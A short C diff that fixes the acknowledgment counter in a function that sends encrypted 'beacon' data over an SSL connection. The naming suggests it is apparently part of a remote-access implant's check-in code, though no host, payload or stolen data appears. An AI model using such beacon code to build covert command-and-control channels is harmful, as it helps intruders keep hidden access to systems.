@@ -701,9 +701,8 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		DLX(4, printf( "\tReceived %d bytes\n", retval));
 
 		recv_sz = atoi(recv_buf + (sizeof(SSL_HDR) - 1));
-		DLX(4, printf("\tAck bytes sent: %d\n", recv_sz));
-
-		//bytes_sent += recv_sz;
+		DLX(4, printf("\tACKed bytes: %d\n", recv_sz));
+		bytes_sent += recv_sz;
 
 	} while (bytes_sent < encrypt_size);
 
